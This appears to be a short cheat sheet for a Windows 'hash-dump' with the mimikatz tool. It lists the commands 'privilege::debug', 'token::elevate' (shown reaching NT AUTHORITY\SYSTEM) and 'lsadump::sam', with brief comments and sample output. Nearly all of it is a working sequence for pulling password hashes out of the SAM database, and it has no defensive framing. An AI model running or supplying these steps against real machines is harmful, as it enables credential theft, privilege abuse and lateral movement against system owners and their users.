::To do a Hash-dump.
::
::- If we have a privilege account:

mimikatz # privilege::debug
Privilege '20' OK 
:: Check if the account has administrative privilege.

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM 
[...]
::The account grants his permissions.


mimikatz # lsadump::sam 
::Performs a hash-dump from SAM.
